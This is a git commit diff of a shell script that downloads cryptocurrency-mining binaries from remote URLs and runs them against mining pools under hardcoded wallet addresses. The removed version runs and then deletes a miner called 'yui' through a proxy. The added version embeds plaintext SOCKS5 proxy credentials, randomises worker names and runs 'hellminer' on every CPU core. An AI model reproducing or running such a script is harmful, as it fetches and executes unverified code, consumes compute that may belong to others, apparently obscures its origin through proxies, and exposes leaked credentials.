8c9510c47ff2bb295312216625f3bcb7bdae7748
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-01-14 18:14:23 +0700

    Update runer.sh

--- runer.sh
+++ runer.sh
@@ -1,7 +1,13 @@
 #!/bin/bash
+proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
+array[0]="0001"
+array[1]="0002"
+array[2]="0003"
+size=${#array[@]}
+index=$(($RANDOM % $size))
+worker=${array[$index]}
 apt-get update
-apt install screen -y
-wget https://gitlab.com/sumarnosabar1/rexors/-/raw/main/yui
-chmod +x yui
-timeout 15m ./yui -a yescryptr16  -o stratum+tcp://yescryptR16.na.mine.zergpool.com:6333 -u RGDDXRXXPzxnd9VMkdJCxRVwgMLoAAf3ym.RX --proxy socks5://79.143.30.163:55418
-rm -rf yui
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c  stratum+tcp://139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p x -t $(nproc --all)
+echo succes
